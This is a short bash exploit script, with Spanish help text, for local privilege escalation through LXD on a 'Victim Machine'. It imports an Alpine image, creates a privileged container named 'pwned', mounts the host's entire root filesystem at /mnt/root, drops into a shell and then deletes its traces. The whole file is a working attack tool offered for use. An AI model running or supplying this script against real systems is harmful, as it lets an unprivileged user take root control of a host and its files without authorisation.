#!/usr/bin/env bash

# STEP 1 => Download https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine (Alpine Image)
# STEP 2 => Execute {bash build-alpine} (As root user)
# STEP 3 => Run script to create the container [Victim Machine]
# STEP 4 => Go to /mnt/root and you will see all the resources of the host machine


function CreateContainer(){
	lxc image import $file --alias AlpineI && lxd init --auto
	lxc init AlpineI pwned -c security.privileged=true
	lxc config device add pwned GiveMeRoot disk source=/ path=/mnt/root recursive=true
	lxc start pwned
	lxc exec pwned /bin/sh
	Cleanup
}

function Cleanup(){
	echo -ne "[+] Removing Container and Image..."
	lxc delete pwned --force && lxc image delete AlpineI
	echo -e " [\xE2\x9C\x94]"
}


function helpPanel(){
	echo -e "\n[+] Uso: $0"
	echo -e "\n\t -t Archivo .tar.gz"
	echo -e "\n\t -h Panel de ayuda"
}




declare param=0; while getopts "t:h" arg; do
	case $arg in
		t) file=$OPTARG; let param+=1;;
		h) ;;
	esac
done

if [ $param -eq 1 ]; then
	CreateContainer
else
	helpPanel
fi



